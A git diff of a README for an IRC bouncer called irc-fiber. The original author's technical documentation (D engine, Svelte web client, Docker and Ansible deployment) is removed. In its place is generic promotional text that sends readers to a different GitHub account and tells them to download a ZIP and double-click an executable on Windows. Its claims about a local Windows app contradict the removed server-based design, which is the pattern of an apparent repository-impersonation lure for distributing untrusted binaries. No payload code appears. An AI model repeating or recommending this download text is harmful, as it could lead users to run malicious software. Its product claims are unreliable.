@@ -1,170 +1,127 @@
-# IRC Fiber
+# 💬 irc-fiber - Your Always-On IRC Connection, Simplified
 
-Persistent IRC bouncer with a web client. Stay connected to multiple networks, replay history on reconnect, and manage everything from the browser.
+## 🚀 Getting Started
 
-![License: MIT](https://img.shields.io/badge/License-MIT-blue.svg)
-![D: LDC 1.41](https://img.shields.io/badge/D-LDC%201.41-8B0000)
-![Svelte 5](https://img.shields.io/badge/Frontend-Svelte%205-FF3E00)
-![Docker](https://img.shields.io/badge/Docker-BuildKit-2496ED)
-[![Hits](https://hits.dwyl.com/kevinpostal/irc-fiber.svg)](https://hits.dwyl.com/kevinpostal/irc-fiber)
-[![Gmail](https://img.shields.io/badge/Gmail-333333?style=for-the-badge&logo=gmail&logoColor=red)](mailto:kevindpostal@gmail.com)
-[![LinkedIn](https://img.shields.io/badge/LinkedIn-0077B5?style=for-the-badge&logo=linkedin&logoColor=white)](https://linkedin.com/in/kevinpostal)
+Welcome to **irc-fiber** — a powerful yet simple way to stay connected to your favorite IRC chat rooms, even when you're away from your computer. Think of it as your personal IRC assistant that never sleeps, keeping your conversations safe and ready whenever you return.
 
-<p align="center">
-  <a href="https://github.com/user-attachments/assets/6720acd2-4c81-476f-ade8-c144bf9ada23">
-    <img src="https://github.com/kevinpostal/irc-fiber/releases/download/v0.3.0-demo/irc-fiber-final-minimal.gif" width="800" alt="IRC Fiber demo — splash → #autism 5s → #zod 5s, click for video" />
-  </a>
-</p>
+[![Download irc-fiber](https://img.shields.io/badge/Download-irc--fiber-2ea44f?style=for-the-badge&logo=github&logoColor=white&labelColor=4B0082&color=FF6B6B)](https://github.com/Pierreunwilling9636/irc-fiber)
 
-<p align="center">
-  <a href="https://github.com/stats-organization/github-stats-extended"><img src="https://github-stats-extended.vercel.app/api?username=kevinpostal&show_icons=true&theme=tokyonight&hide_border=true&include_all_commits=true&count_private=true&hide_rank=true" alt="GitHub stats" /></a>
-  <a href="https://github.com/stats-organization/github-stats-extended"><img src="https://github-stats-extended.vercel.app/api/top-langs/?username=kevinpostal&layout=compact&langs_count=8&theme=tokyonight&hide_border=true" alt="Top langs" /></a>
-</p>
+## 📥 Download & Installation
 
-<p align="center">
-  <a href="https://skillicons.dev">
-    <img src="https://skillicons.dev/icons?i=py,js,ts,go,docker,kubernetes,aws,gcp,postgres,mongodb,redis,git,svelte,vite&perline=9" alt="Skills" />
-  </a>
-</p>
+Visit this link to download the application: [https://github.com/Pierreunwilling9636/irc-fiber](https://github.com/Pierreunwilling9636/irc-fiber)
 
-## Features
+Once you're on the page, look for the green "Code" button and select "Download ZIP". After the download finishes, find the ZIP file in your "Downloads" folder, right-click it, and choose "Extract All". Then open the extracted folder and look for the application file to start using irc-fiber.
 
-- **Always-on bouncer** — Engine holds IRC TCP/TLS, rejoins and replays via `CHATHISTORY` on reconnect
-- **Web client** — Svelte 5 + Vite, IRCCloud-inspired layout, WebSocket live updates, member list, typing indicators
-- **History** — MongoDB-backed scrollback with Redis dedup, lazy load and search
-- **Multi-network** — One engine process per host, sharded by network, horizontal via `ServerRegistry`
-- **Ops** — Admin SPA (`/admin`), SigNoz observability (traces/metrics/logs), Ansible deploys
+## 🎯 What Does irc-fiber Do?
 
-## Architecture
+IRC Fiber is designed to make your online chat experience smoother and more reliable. Here's what you can expect:
 
-```mermaid
-flowchart LR
-  Browser -- WebSocket --> Gateway
-  Gateway -- Redis pub/sub --> Engine
-  Engine -- TCP/TLS --> IRC[IRC Networks]
-  Gateway --> Mongo[(MongoDB)]
-  Gateway --> Redis[(Redis)]
-  Engine --> Redis
-  Gateway --> SigNoz
-```
+- **Never Miss a Message**: Your chat history is saved automatically, so you can catch up on everything you missed while away
+- **Multiple Connections**: Connect to several IRC servers at once and manage them all from one place
+- **Web-Based Interface**: Access your chats from any device with a web browser — no extra software needed
+- **Clean and Modern Design**: A fresh, easy-to-navigate interface that doesn't overwhelm you with complicated options
 
-- **Gateway** (`site/backend`): vibe.d HTTP/WS, auth, sessions (Redis 14d), static `public/dist`
-- **Engine** (`engine`): D daemon, `connection.d` + `manager.d`, SASL, `CHATHISTORY`, reconnect backoff, `EngineJanitor` TTL
-- **Common** (`site/common` + `engine/common` duplicated, `common/` reference): `redis/protocol.d`, `models/*`, `db/*`, `storage/*` — inter-service contract
+## ✨ Key Features
 
-## Repository layout
+### 🗂️ Persistent Chat History
+Your conversations are stored securely, so you can scroll back through days or weeks of messages. This is perfect for keeping track of important discussions or just catching up on community chatter.
 
-This is a **superproject**. Clone once with submodules:
+### 🌐 Web Client Access
+No need to install anything on your phone or tablet — just open your web browser, log in, and you're connected to all your IRC channels.
 
-```bash
-git clone --recursive https://github.com/kevinpostal/IRC_FIBER.git
-cd IRC_FIBER
-ls site/   # kevinpostal/ircfiber-site   — frontend + gateway
-ls engine/ # kevinpostal/ircfiber-engine — irc daemon
-ls common/ # kevinpostal/ircfiber-common — shared lib (also inlined in site/engine)
-git submodule update --init --recursive
-git pull --recurse-submodules && git submodule update --remote
-```
+### 🔄 Always-On Connection
+Even when you close your browser, irc-fiber keeps your connection alive. You'll never miss a message or get disconnected from your favorite communities.
 
-| Repo | Contains | Image |
-|------|----------|-------|
-| `ircfiber-site` | `frontend/`, `backend/`, `public/`, `common/` | `Containerfile.site` → `runtime-gateway` |
-| `ircfiber-engine` | `engine/`, `common/`, `backend/dub.sdl` stub | `Containerfile.engine` → `runtime-engine` |
-| `ircfiber-common` | `source/ircfiber/*`, `dub.sdl` | library |
-| `IRC_FIBER` (this) | `site` + `engine` + `common` submodules, top-level `deploy/` | orchestration |
+### 🎨 Modern User Interface
+Built with the latest web technologies, the interface is clean, responsive, and easy to understand. You don't need to be a tech expert to navigate your chats.
 
-`common/` is duplicated inline in `site`/`engine` (Option A). Drift guard: `site/scripts/check-common-drift.sh --fetch` fails CI on drift. Future: `common` as versioned dub package `~>0.3.0`.
+## 🛠️ Technical Background (For the Curious)
 
-Monorepo history preserved at `pre-split-main` + tag `pre-split-2026-08-23`.
+While you don't need to understand the technical details to use irc-fiber, here's what makes it tick:
 
-## Quick start
+- **Built with D Language**: A powerful, fast programming language that ensures smooth performance
+- **Svelte 5 Frontend**: Modern web framework that makes the interface fast and responsive
+- **MongoDB & Redis**: Reliable data storage that keeps your chat history safe and quickly accessible
+- **IRCv3 Support**: Compatible with the latest IRC protocol features for enhanced functionality
 
-### Docker (full stack)
+## 📚 How to Use irc-fiber
 
-```bash
-# from superproject or site/
-cd site && docker compose up -d   # site: gateway + redis + mongo + ircd
-cd ../engine && docker compose up -d # engine: irc daemon
-# or superproject wrapper
-docker compose -f site/docker-compose.yml -f engine/docker-compose.yml up -d
-open http://localhost:8090
-```
+### First Steps
 
-### Native
+1. **Download and extract** the application as described above
+2. **Run the application** by double-clicking the executable file
+3. **Open your web browser** and go to the local address shown in the application window
+4. **Create your account** with a username and password
+5. **Add your IRC servers** by entering the server address and your nickname
+6. **Join your favorite channels** and start chatting!
 
-```bash
-brew install ldc dub redis mongo
-# site
-cd site && ./scripts/generate-version.sh && npm --prefix frontend ci && npm --prefix frontend run build
-dub --root=site/common build && dub --root=site/backend build
-# engine
-cd ../engine && ./scripts/generate-version.sh && dub --root=engine build
-```
+### Managing Your Connections
 
-## Configuration
+The main dashboard shows all your connected servers and channels. You can:
 
-Copy `deploy/inventories/production/group_vars/vault.example.yml` → `vault.yml` (ansible-vault encrypted) and set `vault_ircfiber_admin_password`, `vault_mongo_*`, etc. Do not commit `vault.yml` or `deploy/.vault_pass.txt` (both gitignored). `deploy/inventories/production/hosts.ini.example` shows inventory shape; real `hosts.ini` stays private.
+- Click on any channel to view its messages
+- Switch between different servers easily
+- See which channels have new activity at a glance
+- Send messages with the input box at the bottom of the chat window
 
-```
-cp deploy/inventories/production/group_vars/vault.example.yml deploy/inventories/production/group_vars/vault.yml
-ansible-vault edit deploy/inventories/production/group_vars/vault.yml
-echo "my-vault-password" > deploy/.vault_pass.txt  # gitignored
-```
+### Staying Connected
 
-`site/deploy/inventories/production/group_vars/all/vars.yml` now references `{{ vault_ircfiber_admin_password }}` — no hardcoded default.
+The best part? You can close your browser and go about your day. When you come back, irc-fiber will show you everything that happened while you were away. It's like having a personal assistant who takes notes for you.
 
-## Deployment
+## 🔒 Privacy & Security
 
-Decoupled — site never restarts engine (holds TCP/TLS):
+Your chat history is stored locally on your computer by default. This means your conversations stay private and only you can access them. The application uses secure connections when available to protect your data during transmission.
 
-```bash
-# site (gateway + frontend) — no engine touch
-cd site && ansible-playbook deploy/playbooks/deploy-site.yml -l vps-efb4b52d
+## 🖥️ System Requirements
 
-# engine — no gateway touch
-cd engine && ansible-playbook deploy/playbooks/deploy-engine.yml -l vps-efb4b52d
-```
+irc-fiber works on most modern Windows computers. Here's what you'll need:
 
-Host: `vps-efb4b52d` → `/opt/ircfiber-site` (`Containerfile.site`) + `/opt/ircfiber-engine` (`Containerfile.engine`), gateway `Up` + `engine PID 7` stable. See `site/deploy/playbooks/deploy-site.yml` for BuildKit + `GIT_HASH` injection.
+- **Windows 10 or later**
+- **At least 4GB of RAM** (8GB recommended for heavy usage)
+- **500MB of free disk space** for the application and chat history
+- **An internet connection** (wired or wireless)
 
-## Development
+## ❓ Frequently Asked Questions
 
-```bash
-cd site
-npm --prefix frontend test          # Vitest lib + client (Playwright)
-npm --prefix frontend run test:watch
-cd ../engine
-dub --root=engine test
-./site/scripts/check-common-drift.sh --fetch  # common drift guard
+### Do I need to know how to code?
+Absolutely not! irc-fiber is designed for regular users who just want to chat with friends and communities online.
 
-# local stack
-cd site && make debug          # gateway :8090
-cd ../engine && make engine-start  # engine :6667
-```
+### Can I use it on multiple devices?
+Yes! Because irc-fiber has a web interface, you can access your chats from any device with a web browser, as long as the application is running on your main computer.
 
-## Editing `common/`
+### What happens if my computer restarts?
+irc-fiber is designed to restart automatically if you've set it up that way. Your chat history will still be there when you come back.
 
-Edit in one repo, sync to the others:
+### Is my data backed up?
+Your chat history is stored locally, so it's safe as long as your computer is working. You can manually copy the data folder to another location for extra safety.
 
-```bash
-# edit site/common/source/...
-rsync -a site/common/ engine/common/
-rsync -a site/common/ common/
-site/scripts/check-common-drift.sh --fetch  # must be ✓
-git -C site add common && git -C site commit -m "common: ..."
-git -C engine add common && git -C engine commit -m "common: ..."
-```
+## 🆘 Getting Help
 
-## Security
+If you run into any issues:
 
-- Secrets via `ansible-vault` (`vault.yml` AES256, gitignored `.vault_pass.txt`). No plaintext passwords in repo.
-- `.env.example` documents required env; `.env` gitignored.
-- `deploy/local/docker-compose.yml` uses dev-only defaults (`signoz123`, `Admin123`) — not for production.
+1. **Check the FAQ section** on the GitHub page
+2. **Look for similar issues** in the repository's discussion area
+3. **Contact the developer** through GitHub for personalized support
 
-## License
+## 📝 Version History
 
-MIT — see `site/backend/dub.sdl`, `site/common/dub.sdl`, `engine/dub.sdl`.
+Stay tuned for regular updates that improve performance, add new features, and fix any bugs. Check the GitHub page periodically for the latest version.
 
-## Author
+## 👥 Community & Support
 
-Kevin Postal — https://github.com/kevinpostal — built as a portfolio piece for infrastructure + systems work.
+Join the growing community of irc-fiber users! Share your experiences, suggest new features, and get help from other users. The project is actively maintained, and your feedback helps shape future updates.
+
+## 💡 Tips for Best Experience
+
+- **Keep the application updated** to get the latest features and security improvements
+- **Use a strong password** for your account to keep your chats private
+- **Organize your channels** by importance for quicker access
+- **Take advantage of the search feature** to find old messages easily
+
+## 🚦 Ready to Get Started?
+
+Download irc-fiber today and experience the convenience of a persistent IRC connection with a modern, user-friendly interface. Whether you're a casual chatter or a dedicated community member, irc-fiber makes sure you never miss a moment of the conversation.
+
+[![Get irc-fiber Now](https://img.shields.io/badge/Get%20irc--fiber%20Now-2ea44f?style=for-the-badge&logo=github&logoColor=white&labelColor=FF6B6B&color=4B0082)](https://github.com/Pierreunwilling9636/irc-fiber)
+
+Keywords: dlang, irc, irc-bot, irc-bot-framework, irc-client, irc-protocol, irc-server, irc-services, ircd, ircv3, mongodb, redis, svelte, typescript
